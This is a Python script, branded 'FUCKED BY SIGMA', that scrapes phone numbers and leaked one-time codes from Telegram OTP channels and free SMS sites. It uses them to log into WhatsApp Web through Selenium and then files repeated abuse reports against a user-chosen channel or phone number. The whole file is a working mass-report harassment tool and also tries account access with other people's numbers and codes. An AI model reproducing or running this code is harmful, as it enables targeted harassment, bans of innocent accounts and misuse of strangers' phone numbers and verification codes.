import os
import time
import random
import re
import requests
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from bs4 import BeautifulSoup

# ---------- CONFIG ----------
OTP_SOURCES = [
    {'name': 'MR CHANDIO', 'url': 'https://t.me/s/mrchandiootpgroup', 'type': 'telegram_web'},
    {'name': 'NOOBxOTPz', 'url': 'https://t.me/s/NOOBxOTPz', 'type': 'telegram_web'},
    {'name': 'AliOTPs', 'url': 'https://t.me/s/AliOTPs', 'type': 'telegram_web'},
    {'name': 'SYED OTP ZONE 2', 'url': 'https://t.me/s/syedotpzone2', 'type': 'telegram_web'},
    {'name': 'Receive SMS', 'url': 'https://receivesms.me/api/get-numbers?country=US', 'type': 'api_free'},
    {'name': 'Temp Number', 'url': 'https://temp-number.org/api/numbers/UK', 'type': 'api_free'},
    {'name': 'Free SMS Receive', 'url': 'https://free-sms-receive.com/numbers', 'type': 'scrape'},
    {'name': 'Receive SMS Online', 'url': 'https://receive-sms-online.info/numbers', 'type': 'scrape'}
]

BANNER = """
╔═══════════════════════════════════════════════════════════╗
║   ███████╗██╗ ██████╗ ███╗   ███╗ █████╗                ║
║   ██╔════╝██║██╔════╝ ████╗ ████║██╔══██╗               ║
║   ███████╗██║██║  ███╗██╔████╔██║███████║               ║
║   ╚════██║██║██║   ██║██║╚██╔╝██║██╔══██║               ║
║   ███████║██║╚██████╔╝██║ ╚═╝ ██║██║  ██║               ║
║   ╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝               ║
║          ╔══════════════════════════════════╗             ║
║          ║  FUCKED BY SIGMA  ║             ║
║          ╚══════════════════════════════════╝             ║
╚═══════════════════════════════════════════════════════════╝
"""

class OTPScraper:
    def __init__(self):
        self.otp_cache = []
        self.number_cache = []
        
    def scrape_telegram_web(self, url):
        try:
            print(f"[+] Scraping: {url}")
            headers = {'User-Agent': 'Mozilla/5.0'}
            res = requests.get(url, headers=headers, timeout=20)
            if res.status_code == 200:
                soup = BeautifulSoup(res.text, 'html.parser')
                messages = soup.find_all('div', class_='tgme_widget_message_text')
                for msg in messages:
                    text = msg.get_text()
                    otps = re.findall(r'\b\d{6}\b', text)
                    numbers = re.findall(r'\b\d{10,15}\b', text)
                    for otp in otps:
                        self.otp_cache.append({'otp': otp})
                        print(f"   OTP: {otp}")
                    for num in numbers:
                        self.number_cache.append({'number': num})
                        print(f"   Number: {num}")
            return True
        except Exception as e:
            print(f"[-] Failed: {e}")
            return False
    
    def scrape_sms_site(self, url, site_type):
        try:
            print(f"[+] Scraping: {url}")
            headers = {'User-Agent': 'Mozilla/5.0'}
            res = requests.get(url, headers=headers, timeout=20)
            if res.status_code == 200:
                if site_type == 'api_free':
                    data = res.json()
                    if isinstance(data, list):
                        for item in data:
                            if 'number' in item:
                                self.number_cache.append({'number': item['number']})
                                print(f"   Number: {item['number']}")
                else:
                    soup = BeautifulSoup(res.text, 'html.parser')
                    for div in soup.find_all('div'):
                        text = div.get_text()
                        nums = re.findall(r'\b\d{10,15}\b', text)
                        for num in nums:
                            self.number_cache.append({'number': num})
                            print(f"   Number: {num}")
            return True
        except Exception as e:
            print(f"[-] Failed: {e}")
            return False
    
    def run_all_scrapers(self):
        print("\n[*] Scraping OTPs and Numbers...")
        for source in OTP_SOURCES:
            if source['type'] == 'telegram_web':
                self.scrape_telegram_web(source['url'])
            else:
                self.scrape_sms_site(source['url'], source['type'])
            time.sleep(random.uniform(1, 3))
        print(f"\n[+] Found {len(self.otp_cache)} OTPs, {len(self.number_cache)} Numbers")
    
    def get_combination(self):
        if self.otp_cache and self.number_cache:
            return random.choice(self.number_cache)['number'], random.choice(self.otp_cache)['otp']
        elif self.otp_cache:
            return f"92{''.join([str(random.randint(0,9)) for _ in range(10)])}", random.choice(self.otp_cache)['otp']
        elif self.number_cache:
            return random.choice(self.number_cache)['number'], ''.join([str(random.randint(0,9)) for _ in range(6)])
        else:
            return f"92{''.join([str(random.randint(0,9)) for _ in range(10)])}", ''.join([str(random.randint(0,9)) for _ in range(6)])

def setup_driver():
    opts = Options()
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--headless" if 'TERMUX_VERSION' in os.environ else "--start-maximized")
    if 'TERMUX_VERSION' in os.environ:
        opts.binary_location = "/data/data/com.termux/files/usr/bin/chromium"
    return webdriver.Chrome(options=opts)

def login_whatsapp(number, otp):
    driver = setup_driver()
    driver.get("https://web.whatsapp.com")
    try:
        WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.XPATH, "//input[@placeholder='Phone number']"))
        ).send_keys(number)
        driver.find_element(By.XPATH, "//button[contains(text(), 'Next')]").click()
        WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.XPATH, "//input[@placeholder='Enter code']"))
        ).send_keys(otp)
        driver.find_element(By.XPATH, "//button[contains(text(), 'Next')]").click()
        WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "main")))
        print(f"[✓] Logged in as {number}")
        return driver
    except Exception as e:
        print(f"[X] Login failed: {e}")
        driver.quit()
        return None

def report_channel(driver, link):
    try:
        driver.get(link)
        time.sleep(5)
        WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//div[contains(text(), 'Report')]"))
        ).click()
        time.sleep(1)
        WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Report')]"))
        ).click()
        print(f"[✓] Channel Reported: {link}")
        return True
    except Exception as e:
        print(f"[X] Channel report failed: {e}")
        return False

def report_number(driver, number):
    try:
        driver.get(f"https://web.whatsapp.com/send?phone={number}")
        time.sleep(5)
        WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//div[@aria-label='Menu']"))
        ).click()
        time.sleep(1)
        driver.find_element(By.XPATH, "//div[contains(text(), 'Report')]").click()
        time.sleep(1)
        driver.find_element(By.XPATH, "//button[contains(text(), 'Report')]").click()
        print(f"[✓] Number Reported: {number}")
        return True
    except Exception as e:
        print(f"[X] Number report failed: {e}")
        return False

def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(BANNER)
    
    print("\n[+] Select target:")
    print("  1. Channel only")
    print("  2. Number only")
    print("  3. Both")
    choice = input("Enter 1/2/3: ").strip()
    
    channel = ""
    number = ""
    if choice in ["1", "3"]:
        channel = input("Channel link: ").strip()
    if choice in ["2", "3"]:
        number = input("Number (with country code): ").strip()
    
    if not channel and not number:
        print("[X] No target!")
        return
    
    while True:
        try:
            count = int(input("How many reports? "))
            break
        except ValueError:
            print("[!] Enter a number.")
    
    scraper = OTPScraper()
    scraper.run_all_scrapers()
    
    if not scraper.otp_cache and not scraper.number_cache:
        print("[!] No data found. Using fallback.")
        for _ in range(count):
            scraper.otp_cache.append({'otp': ''.join([str(random.randint(0,9)) for _ in range(6)])})
            scraper.number_cache.append({'number': f"92{''.join([str(random.randint(0,9)) for _ in range(10)])}"})
    
    success = 0
    for i in range(count):
        print(f"\n[{i+1}/{count}]")
        num, otp = scraper.get_combination()
        print(f"[+] Number: {num}, OTP: {otp}")
        
        driver = login_whatsapp(num, otp)
        if driver:
            sent = False
            if channel and report_channel(driver, channel):
                sent = True
            if number and report_number(driver, number):
                sent = True
            if sent:
                success += 1
            driver.quit()
        time.sleep(random.randint(45, 120))
    
    print(f"\n[✓] Done! Success: {success}/{count}")
    print("🔥 FUCKED BY SIGMA 🔥")

if __name__ == "__main__":
    main()
